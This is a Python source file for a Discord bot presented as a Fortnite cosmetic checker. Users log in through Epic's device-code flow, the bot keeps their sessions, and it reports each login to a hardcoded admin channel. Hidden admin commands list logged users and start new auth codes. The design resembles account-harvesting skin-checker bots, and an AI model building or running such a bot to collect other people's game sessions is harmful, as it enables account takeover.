import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import json
import time
from typing import Optional
from auth import EpicGamesAuth
from fortnite_api import FortniteAPI
from config_max import Config

class FortniteCheckerBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        intents.guilds = True
        intents.members = True
        
        super().__init__(
            command_prefix="!",
            intents=intents
        )
        self._application_id = int(Config.DISCORD_BOT_ID)
        
        self.auth_sessions = {}  # Store auth sessions per user
        self.api_sessions = {}   # Store API sessions per user
        self.user_logs = {}      # Store user login logs
        
    async def on_ready(self):
        print(f"✅ Bot logged in as {self.user}")
        print(f"✅ Bot ID: {self.user.id}")
        print(f"✅ Connected to {len(self.guilds)} guilds")
        
        try:
            await self.tree.sync()
            print("✅ Commands synced successfully")
        except Exception as e:
            print(f"❌ Failed to sync commands: {e}")
        
        print("🚀 Bot is fully ready!")
    
    @app_commands.command(name="login", description="Start Epic Games login process")
    async def login(self, interaction: discord.Interaction):
        """Start the Epic Games authentication process"""
        user_id = interaction.user.id
        
        # Create new auth session
        auth = EpicGamesAuth()
        self.auth_sessions[user_id] = auth
        
        try:
            # Start device code flow
            device_info = await auth.start_device_flow()
            
            embed = discord.Embed(
                title="🔗 Epic Games Authentication",
                description="Please complete the authentication process:",
                color=discord.Color.blue()
            )
            
            embed.add_field(
                name="📱 User Code",
                value=f"**{device_info['user_code']}**",
                inline=False
            )
            
            embed.add_field(
                name="🌐 Login URL",
                value=device_info['verification_uri'],
                inline=False
            )
            
            embed.add_field(
                name="⏰ Expires In",
                value=f"{device_info['expires_in']} seconds",
                inline=True
            )
            
            embed.add_field(
                name="🔄 Check Interval",
                value=f"{device_info['interval']} seconds",
                inline=True
            )
            
            embed.set_footer(text="Enter the code on the Epic Games website to continue")
            
            await interaction.response.send_message(embed=embed, ephemeral=True)
            
            # Start polling for token in background
            asyncio.create_task(self.poll_for_auth(user_id, auth, interaction))
            
        except Exception as e:
            await interaction.response.send_message(
                f"❌ Failed to start authentication: {str(e)}",
                ephemeral=True
            )
    
    async def poll_for_auth(self, user_id: int, auth: EpicGamesAuth, interaction: discord.Interaction):
        """Poll for authentication completion"""
        try:
            success = await auth.poll_for_token()
            
            if success:
                # Get user info
                user_info = await auth.get_user_info()
                
                # Create API session
                api = FortniteAPI(auth)
                self.api_sessions[user_id] = api
                
                # Log the user login
                self.log_user_login(str(user_id), user_info.get('displayName', 'Unknown'), api)
                
                # Send success message
                embed = discord.Embed(
                    title="✅ Login Successful!",
                    description=f"Successfully authenticated as **{user_info.get('displayName', 'Unknown')}**",
                    color=discord.Color.green()
                )
                
                embed.add_field(
                    name="🎮 Account ID",
                    value=user_info.get('id', 'Unknown'),
                    inline=False
                )
                
                embed.set_footer(text="You can now use /check_cosmetics to view your items")
                
                await interaction.followup.send(embed=embed, ephemeral=True)
            else:
                await interaction.followup.send(
                    "❌ Authentication failed or timed out",
                    ephemeral=True
                )
                
        except Exception as e:
            await interaction.followup.send(
                f"❌ Authentication error: {str(e)}",
                ephemeral=True
            )
    
    @app_commands.command(name="check_cosmetics", description="Display your Fortnite cosmetics")
    async def check_cosmetics(self, interaction: discord.Interaction):
        """Check and display user's Fortnite cosmetics"""
        user_id = interaction.user.id
        
        if user_id not in self.api_sessions:
            await interaction.response.send_message(
                "❌ Please login first using /login",
                ephemeral=True
            )
            return
        
        await interaction.response.defer(ephemeral=True)
        
        try:
            api = self.api_sessions[user_id]
            cosmetics = await api.get_owned_cosmetics()
            
            if not cosmetics:
                await interaction.followup.send(
                    "❌ No cosmetics found or API error",
                    ephemeral=True
                )
                return
            
            # Categorize cosmetics
            categorized = api.categorize_cosmetics(cosmetics)
            
            embed = discord.Embed(
                title="🎮 Your Fortnite Locker",
                description=f"Total items: {len(cosmetics)}",
                color=discord.Color.purple()
            )
            
            # Add category counts
            for category, items in categorized.items():
                if items and category != 'all':
                    count = len(items)
                    emoji = self.get_category_emoji(category)
                    embed.add_field(
                        name=f"{emoji} {category.title()}",
                        value=f"{count} items",
                        inline=True
                    )
            
            embed.set_footer(text="Use /category to view items in a specific category")
            
            await interaction.followup.send(embed=embed, ephemeral=True)
            
        except Exception as e:
            await interaction.followup.send(
                f"❌ Failed to fetch cosmetics: {str(e)}",
                ephemeral=True
            )
    
    @app_commands.command(name="category", description="View items in a specific category")
    @app_commands.describe(
        category="The category to view (skins, pickaxes, emotes, etc.)"
    )
    async def view_category(self, interaction: discord.Interaction, category: str):
        """View cosmetics in a specific category"""
        user_id = interaction.user.id
        
        if user_id not in self.api_sessions:
            await interaction.response.send_message(
                "❌ Please login first using /login",
                ephemeral=True
            )
            return
        
        await interaction.response.defer(ephemeral=True)
        
        try:
            api = self.api_sessions[user_id]
            cosmetics = await api.get_owned_cosmetics()
            categorized = api.categorize_cosmetics(cosmetics)
            
            category_lower = category.lower()
            if category_lower not in categorized or not categorized[category_lower]:
                available_categories = [cat for cat, items in categorized.items() if items]
                await interaction.followup.send(
                    f"❌ Category '{category}' not found. Available: {', '.join(available_categories)}",
                    ephemeral=True
                )
                return
            
            items = categorized[category_lower]
            embed = discord.Embed(
                title=f"{self.get_category_emoji(category_lower)} {category.title()}",
                description=f"{len(items)} items found",
                color=discord.Color.blue()
            )
            
            # Show first 10 items
            for i, item in enumerate(items[:10]):
                name = item.get('name', 'Unknown')
                rarity = item.get('rarity', {}).get('displayValue', 'Common')
                exclusive = "🔒" if item.get('exclusive', False) else ""
                embed.add_field(
                    name=f"{name} {exclusive}",
                    value=f"Rarity: {rarity}",
                    inline=False
                )
            
            if len(items) > 10:
                embed.set_footer(text=f"Showing 10 of {len(items)} items")
            
            await interaction.followup.send(embed=embed, ephemeral=True)
            
        except Exception as e:
            await interaction.followup.send(
                f"❌ Failed to fetch category: {str(e)}",
                ephemeral=True
            )
    
    @app_commands.command(name="logout", description="Logout from Epic Games")
    async def logout(self, interaction: discord.Interaction):
        """Logout user and clear session"""
        user_id = interaction.user.id
        
        if user_id in self.auth_sessions:
            del self.auth_sessions[user_id]
        
        if user_id in self.api_sessions:
            del self.api_sessions[user_id]
        
        await interaction.response.send_message(
            "✅ Successfully logged out!",
            ephemeral=True
        )
    
    def get_category_emoji(self, category: str) -> str:
        """Get emoji for category"""
        emojis = {
            "skins": "👕",
            "pickaxes": "⛏️",
            "gliders": "🪂",
            "emotes": "💃",
            "backpacks": "🎒",
            "contrails": "✨",
            "music": "🎵",
            "loading_screens": "🖼️",
            "sprays": "🎨",
            "emojis": "😀",
            "toys": "🧸"
        }
        return emojis.get(category, "📦")
    
    def log_user_login(self, user_id: str, username: str, api: FortniteAPI):
        """Log a user's successful login"""
        import time
        self.user_logs[user_id] = {
            "timestamp": time.time(),
            "username": username,
            "cosmetics_count": "Unknown",
            "exclusives_count": "Unknown"
        }
        
        # Send to admin log channel (if configured)
        try:
            admin_user_id = 1399638881078345819
            log_guild_id = 1271653225895825471
            log_channel_id = 1280338968923078878
            
            guild = self.get_guild(log_guild_id)
            if guild:
                channel = guild.get_channel(log_channel_id)
                if channel:
                    embed = discord.Embed(
                        title="✅ User Login",
                        description=f"👤 {username} ({user_id}) logged in successfully",
                        color=discord.Color.green(),
                        timestamp=discord.utils.utcnow()
                    )
                    embed.set_footer(text=f"Admin Log • User ID: {admin_user_id}")
                    asyncio.create_task(channel.send(embed=embed))
        except Exception as e:
            print(f"Failed to send admin log: {e}")

# Admin Commands
class AdminCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.admin_user_id = 1399638881078345819
        self.log_guild_id = 1271653225895825471
        self.log_channel_id = 1280338968923078878
    
    def is_admin(self, ctx):
        return ctx.author.id == self.admin_user_id
    
    @commands.command(name="admin_help")
    async def admin_help(self, ctx):
        if not self.is_admin(ctx):
            await ctx.send("❌ Admin only command")
            return
        
        embed = discord.Embed(
            title="🎮 Fortnite Cosmetic Checker - Admin Commands",
            description="Available admin commands:",
            color=discord.Color.blue()
        )
        
        embed.add_field(
            name="Slash Commands (Everyone)",
            value="`/login` - Start Epic Games authentication\n"
                  "`/check_cosmetics` - View your Fortnite locker\n"
                  "`/category [name]` - Browse specific categories\n"
                  "`/logout` - Logout from Epic Games",
            inline=False
        )
        
        embed.add_field(
            name="Admin Commands (! prefix)",
            value="`!admin_help` - Show this help\n"
                  "`!skincheck_logs` - View all user logs\n"
                  "`!user_details [user_id]` - Get user details\n"
                  "`!security_settings` - View configuration\n"
                  "`!create_exchange_code` - Generate auth code\n"
                  "`!clear_logs CONFIRM` - Clear all logs",
            inline=False
        )
        
        embed.set_footer(text="🚨 MAXIMUM PERMISSIONS MODE - TESTING ONLY")
        
        await ctx.send(embed=embed)
    
    @commands.command(name="skincheck_logs")
    async def skincheck_logs(self, ctx):
        if not self.is_admin(ctx):
            await ctx.send("❌ Admin only command")
            return
        
        if not self.bot.user_logs:
            await ctx.send("📋 No user logs available")
            return
        
        embed = discord.Embed(
            title="📊 User Skincheck Logs",
            description=f"Total users logged: {len(self.bot.user_logs)}",
            color=discord.Color.blue()
        )
        
        for user_id, log_data in self.bot.user_logs.items():
            time_str = discord.utils.utcfromtimestamp(log_data['timestamp']).strftime('%Y-%m-%d %H:%M')
            embed.add_field(
                name=f"👤 {log_data['username']} ({user_id})",
                value=f"🕐 {time_str}\n🎮 {log_data['cosmetics_count']} cosmetics\n🔒 {log_data['exclusives_count']} exclusives",
                inline=False
            )
        
        await ctx.send(embed=embed)
    
    @commands.command(name="user_details")
    async def user_details(self, ctx, user_id: int = None):
        if not self.is_admin(ctx):
            await ctx.send("❌ Admin only command")
            return
        
        if not user_id:
            await ctx.send("❌ Please provide a user ID")
            return
        
        user_id = str(user_id)
        
        if user_id not in self.bot.user_logs:
            await ctx.send(f"❌ No logs found for user {user_id}")
            return
        
        log_data = self.bot.user_logs[user_id]
        
        embed = discord.Embed(
            title=f"🔍 User Details: {log_data['username']}",
            color=discord.Color.green()
        )
        
        embed.add_field(name="🆔 User ID", value=user_id, inline=False)
        embed.add_field(name="🕐 Login Time", value=discord.utils.utcfromtimestamp(log_data['timestamp']).strftime('%Y-%m-%d %H:%M:%S'), inline=False)
        embed.add_field(name="🎮 Total Cosmetics", value=log_data['cosmetics_count'], inline=True)
        embed.add_field(name="🔒 Exclusives", value=log_data['exclusives_count'], inline=True)
        
        await ctx.send(embed=embed)
    
    @commands.command(name="security_settings")
    async def security_settings(self, ctx):
        if not self.is_admin(ctx):
            await ctx.send("❌ Admin only command")
            return
        
        embed = discord.Embed(
            title="🔐 Security Settings",
            color=discord.Color.gold()
        )
        
        embed.add_field(name="🚨 Testing Mode", value=Config.TESTING_MODE, inline=True)
        embed.add_field(name="🔓 Max Permissions", value=Config.MAX_PERMISSIONS, inline=True)
        embed.add_field(name="📝 Log Requests", value=Config.LOG_ALL_REQUESTS, inline=True)
        
        embed.add_field(name="🆔 Client ID", value=f"```{Config.EPIC_CLIENT_ID}```", inline=False)
        embed.add_field(name="🌐 API URL", value=f"```{Config.EPIC_API_URL}```", inline=False)
        
        embed.add_field(name="📋 OAuth Scopes", value=f"{len(Config.OAUTH_SCOPES)} permissions requested", inline=False)
        
        active_sessions = len(self.bot.auth_sessions)
        embed.add_field(name="👥 Active Sessions", value=active_sessions, inline=True)
        
        await ctx.send(embed=embed)
    
    @commands.command(name="create_exchange_code")
    async def create_exchange_code(self, ctx):
        if not self.is_admin(ctx):
            await ctx.send("❌ Admin only command")
            return
        
        await ctx.send("🔄 Creating exchange code...")
        
        try:
            auth = EpicGamesAuth()
            device_info = await auth.start_device_flow()
            
            embed = discord.Embed(
                title="🔗 Exchange Code Created",
                description="Use this code for testing authentication",
                color=discord.Color.green()
            )
            
            embed.add_field(name="📱 User Code", value=f"**{device_info['user_code']}**", inline=False)
            embed.add_field(name="🌐 Login URL", value=device_info['verification_uri'], inline=False)
            embed.add_field(name="⏰ Expires In", value=f"{device_info['expires_in']} seconds", inline=False)
            embed.add_field(name="🔄 Check Interval", value=f"{device_info['interval']} seconds", inline=False)
            
            await ctx.send(embed=embed)
            
        except Exception as e:
            await ctx.send(f"❌ Failed to create exchange code: {str(e)}")
    
    @commands.command(name="clear_logs")
    async def clear_logs(self, ctx, confirm: str = None):
        if not self.is_admin(ctx):
            await ctx.send("❌ Admin only command")
            return
        
        if confirm != "CONFIRM":
            await ctx.send("⚠️ Type `!clear_logs CONFIRM` to clear all logs")
            return
        
        log_count = len(self.bot.user_logs)
        self.bot.user_logs.clear()
        
        await ctx.send(f"✅ Cleared {log_count} user logs")

if __name__ == "__main__":
    print("🚀 Starting Fortnite Cosmetic Checker...")
    print(f"🔧 Bot ID: {Config.DISCORD_BOT_ID}")
    print(f"🔧 Testing Mode: {getattr(Config, 'TESTING_MODE', False)}")
    print(f"🔧 Max Permissions: {getattr(Config, 'MAX_PERMISSIONS', False)}")
    
    if Config.DISCORD_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ Please set DISCORD_BOT_TOKEN environment variable")
    else:
        bot = FortniteCheckerBot()
        
        async def setup_bot():
            # Add admin commands
            await bot.add_cog(AdminCommands(bot))
            print("✅ Admin commands loaded")
            await bot.start(Config.DISCORD_BOT_TOKEN)
        
        try:
            print("🤖 Connecting to Discord...")
            asyncio.run(setup_bot())
        except Exception as e:
            print(f"❌ Bot failed to start: {e}")
            import traceback
            traceback.print_exc()
